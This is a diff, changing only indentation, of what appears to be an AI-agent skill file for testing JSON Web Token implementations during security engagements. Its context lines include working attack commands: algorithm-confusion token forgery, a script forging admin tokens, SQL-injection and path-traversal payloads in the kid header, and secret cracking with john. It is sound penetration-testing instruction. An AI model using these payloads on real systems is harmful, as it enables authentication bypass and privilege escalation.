@@ -1,10 +1,10 @@
 ---
 name: testing-for-json-web-token-vulnerabilities
 description: Tests JWT implementations for algorithm confusion, "none" algorithm bypass,
-  kid/jku parameter injection, and weak secret exploitation using jwt_tool and Burp Suite's
-  JWT Editor extension, aiming to achieve authentication bypass and privilege escalation.
-  Use when assessing JWT-based auth/session management, OAuth2/OIDC token handling, or
-  SSO systems during a security engagement.
+ kid/jku parameter injection, and weak secret exploitation using jwt_tool and Burp Suite's
+ JWT Editor extension, aiming to achieve authentication bypass and privilege escalation.
+ Use when assessing JWT-based auth/session management, OAuth2/OIDC token handling, or
+ SSO systems during a security engagement.
 domain: cybersecurity
 subdomain: web-application-security
 tags:
@@ -109,7 +109,7 @@ curl http://target.com/.well-known/jwks.json
 
 # From SSL certificate
 openssl s_client -connect target.com:443 </dev/null 2>/dev/null | \
-  openssl x509 -pubkey -noout > public_key.pem
+ openssl x509 -pubkey -noout > public_key.pem
 
 # Step 2: Forge token using public key as HMAC secret
 python3 jwt_tool.py <JWT_TOKEN> -X k -pk public_key.pem
@@ -120,7 +120,7 @@ python3 jwt_tool.py <JWT_TOKEN> -X k -pk public_key.pem
 python3 -c "
 import jwt
 with open('public_key.pem', 'r') as f:
-    public_key = f.read()
+ public_key = f.read()
 payload = {'sub': 'admin', 'role': 'admin', 'iat': 1700000000, 'exp': 1900000000}
 token = jwt.encode(payload, public_key, algorithm='HS256')
 print(token)
@@ -131,11 +131,11 @@ print(token)
 ```bash
 # SQL Injection via kid
 python3 jwt_tool.py <JWT_TOKEN> -I -hc kid -hv "' UNION SELECT 'secret-key' FROM dual--" \
-  -S hs256 -p "secret-key"
+ -S hs256 -p "secret-key"
 
 # Path Traversal via kid
 python3 jwt_tool.py <JWT_TOKEN> -I -hc kid -hv "../../dev/null" \
-  -S hs256 -p ""
+ -S hs256 -p ""
 
 # Kid pointing to empty file (sign with empty string)
 python3 jwt_tool.py <JWT_TOKEN> -I -hc kid -hv "/dev/null" -S hs256 -p ""
@@ -186,7 +186,7 @@ john jwt.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=HMAC-SHA256
 
 # Once secret is found, forge arbitrary tokens
 python3 jwt_tool.py <JWT_TOKEN> -S hs256 -p "discovered_secret" \
-  -I -pc role -pv admin -pc sub -pv "admin@target.com"
+ -I -pc role -pv admin -pc sub -pv "admin@target.com"
 ```
 
 ## Key Concepts
